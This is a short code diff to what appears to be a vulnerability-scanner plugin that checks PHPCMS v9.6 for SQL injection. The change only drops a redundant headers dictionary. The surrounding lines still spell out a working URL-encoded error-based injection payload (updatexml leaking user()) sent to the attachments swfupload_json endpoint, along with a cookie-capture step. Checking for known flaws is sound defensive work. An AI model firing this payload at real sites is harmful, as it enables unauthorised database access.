@@ -19,10 +19,6 @@ class phpcms_v96_sqli_BaseVerify:
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
-        headers2 = {
-            "Content-Type":"application/x-www-form-urlencoded",
-            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
-        }
         url_prefix = self.url + "/index.php?m=wap&c=index&a=init&siteid=1"
         tmp_cookie = {}
         try:
@@ -36,7 +32,7 @@ class phpcms_v96_sqli_BaseVerify:
         }
         url_suffix = self.url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"
         try:
-            req2 = requests.post(url_suffix, data=post_data, headers=headers2, timeout=10, verify=False)
+            req2 = requests.post(url_suffix, data=post_data, headers=headers, timeout=10, verify=False)
             for cookie in req2.cookies:
                 tmp_cookie = cookie.value
         except:
